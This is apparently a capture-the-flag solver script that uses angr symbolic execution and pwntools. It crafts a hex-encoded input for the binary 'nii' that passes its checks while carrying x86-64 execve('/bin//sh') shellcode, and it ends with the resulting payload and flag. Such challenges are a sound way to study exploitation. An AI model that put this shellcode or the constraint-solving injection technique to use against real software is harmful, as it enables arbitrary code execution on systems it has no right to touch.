#!/usr/bin/env ipython

import angr
from angr import SIM_PROCEDURES
from claripy import BVV, BVS, Or, And, If, Concat
from IPython import embed
from pwn import *
from pwnlib.shellcraft.amd64 import *
from pwnlib.shellcraft.amd64.linux import *
import logging
import signal
import os
# =>

def kys():
    os.system("kill %d" % os.getpid())



def sigint_handler(signum, frame):
    print("Stopping Execution for Debug. If you want to kill the programm issue: kys()")
    embed()


signal.signal(signal.SIGINT, sigint_handler)


logger = logging.getLogger('angr')
# => <Logger angr (WARNING)>

# logger.setLevel('DEBUG')

binary = "./nii"
# => './nii'

p = angr.Project(
    binary,
    load_options={"auto_load_libs": False}
)
# => <Project ./nii>

# inp_len = BVS("size", 9)
inp_len = 100
PL = BVS("PL", 50*8)

s = p.factory.blank_state(addr=0x4010a2)
s.options.add(angr.options.LAZY_SOLVES)
# => <SimState @ 0x4010a2>
# s = p.factory.blank_state(addr=0x401127)
# => <SimState @ 0x4010a2>
# s = p.factory.entry_state(stdin=angr.SimFile('/dev/stdin', content=PL))
# =>

s.memory.store(0x402064, PL)
s.regs.rbx = inp_len + 1 >> 1
s.regs.rax = inp_len + 1
s.regs.rsi = 0x402064
s.regs.rdi = 0
s.regs.rdx = 0

# s.add_constraints(*[Or(And(byte > 47, byte < 58), And(byte > 63, byte < 71)) for byte in PL.chop(8)])

# s.add_constraints(inp_len == 100)

SHELLCODE = b"4831F65648BF2F62696E2F2F736857545F6A3B58990F05"
# s.add_constraints(s.memory.load(0x402078, size=len(SHELLCODE)) == SHELLCODE)
# s.add_constraints(Concat(*PL.chop(8)[40:40+len(SHELLCODE)]) == SHELLCODE)
# s.add_constraints(inp_len % 2 == 0)

# s.add_constraints(*[ byte == (((inp_chars[i] - 48) << 0xc) & 0xff)
#                         + (inp_chars[i+1] - 48) for i, byte in enumerate(PL.chop(8))])

def transform(state):
    state.regs.al -= If(And(state.regs.al > 47, state.regs.al < 58), BVV(0x30, 8), BVV(0x37, 8))
    # state.regs.al -= If(And(state.regs.al > 47, state.regs.al < 58),
    #                     BVV(0x30, 8), BVV(0x37, 8))

# p.hook(0x4010b0, length=5)(transform)
# p.hook(0x4010bd, length=5)(transform)

# @p.hook(0x4010bd, length=5)
# def transform(state):
#     # state.regs.al = state.regs.al - 0x30
#     state.regs.al -= If(And(state.regs.al > 47, state.regs.al < 58),
#                        0x30, 0x37)


# TODO: angr is ignoring the constraint on edx == edi, find out why?
# @p.hook(0x40118b, length=0)
# def check(state):
#     state.regs.rip = If(state.regs.edx == state.regs.edi, 0x4011b4, 0x401000)


# @p.hook(0x40118d, length=6)
# def check(state):
    # state.regs.rip = If(state.regs.edi == state.regs.edx, 0x401193, 0x401000)

context.arch = "amd64"

# SHELLCODE = b""
# SHELLCODE += asm("mov rsi, 0x402000")
# SHELLCODE += asm("xor rdi, rdi")
# SHELLCODE += asm("mov rdx, 0x100")
# SHELLCODE += asm("syscall")
# SHELLCODE += asm("mov rax, 0x402000")
# SHELLCODE += asm("call rax")

# asm(shellcraft.amd64.linux.sh())


# SHELLCODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# fail = BVV(0x401122, 64)
# passed = BVV(0x40112a, 64)
# => 'test'
# @p.hook(0x401127, length=3)
# def valid_shellcode(state):
#     shellcode = state.memory.load(0x402074, size=len(SHELLCODE))
#     state.regs.rip = If(shellcode != SHELLCODE, fail, passed)

# sm = p.factory.simulation_manager(s, veritesting=True)
sm = p.factory.simulation_manager(s)
# => <SimulationManager with 1 active>

find_addr = 0x4011b4
# find_addr = 0x40112d
# avoid_addr = [0x401000,0x401122]
avoid_addr = []

def get_addr(state):
    print(state.regs.rip)
    if state.addr == 0x4010b5:
        embed()
    # print(state.regs.rax)

# s.inspect.b("irsb", angr.BP_AFTER, action=get_addr)
s.inspect.b("irsb", angr.BP_AFTER, action=get_addr)

embed()

# sm.use_technique(angr.ExplorationTechnique.LengthLimiter()


sm.explore(find=find_addr, avoid=avoid_addr)

# sm.active[0].add_constraints(sm.active[0].memory.load(0x402084, size=len(SHELLCODE) == SHELLCODE))
# sm.active[0].add_constraints(PL[20:24] == SHELLCODE)


def test_shellcode(found_state):
    copy = found_state.copy()
    copy.add_constraints(copy.regs.edi == copy.regs.edx)
    copy.add_constraints(copy.memory.load(0x402078, size=len(SHELLCODE)) == SHELLCODE)

    return copy.solver.eval(PL, cast_to=bytes)[:copy.solver.eval(inp_len)]

def get_possible_solutions(found_state):
    print(found_state.solver.eval_upto(found_state.memory.load(0x402078, size=60), 100, cast_to=bytes))

def to_sol(out):
    sol = ""
    for c in out:
        if ord(chr(c)) > 57:
            sol += chr(c + 7)
        else:
            sol += chr(c)
    return sol

embed()

to_sol(test_shellcode(sm.found[0]))
# => 4E494976302E313A54776C7450726E637F454C464831F65648BF2F62696E2F2F736857545F6A3B58990F0567D1E7350E382C

# _[:32] + "AEB14BA3" + _[40:]
# => 4E494976302E313A54776C7450726E63AEB14BA34831F65648BF2F62696E2F2F736857545F6A3B58990F0567D1E7350E382C

# cat flag.txt
# It's dangerous to go alone. Take this!
# flag{shellcoding_is_a_rev_skill,_too!_8F13E8F6}
